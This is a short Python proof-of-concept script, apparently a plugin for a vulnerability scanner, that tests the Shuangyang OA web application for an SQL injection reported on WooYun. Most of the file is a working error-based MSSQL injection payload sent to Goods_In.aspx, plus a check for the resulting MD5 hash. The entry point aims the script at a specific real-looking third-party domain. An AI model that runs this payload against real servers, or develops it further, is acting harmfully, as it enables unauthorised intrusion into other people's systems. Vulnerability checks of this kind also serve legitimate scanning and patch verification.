#!usr/bin/env python
# *-* coding:utf-8 *-*

"""
POC Name  :  双杨oa两处sql注入
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2010-0149795

"""
import time
def assign(service, arg):
    if service == "shuangyang_oa":
        return True, arg

def audit(arg):
    payload = "DSOA_TY/Office_Supplies/Goods_In.aspx?info_id=1&list=11)%20AND%208938=CONVERT(INT,(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27123%27))))"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    time.sleep(1)
    if code == 500 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(url)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('shuangyang_oa', 'http://xinhuachongming.com.cn/')[1])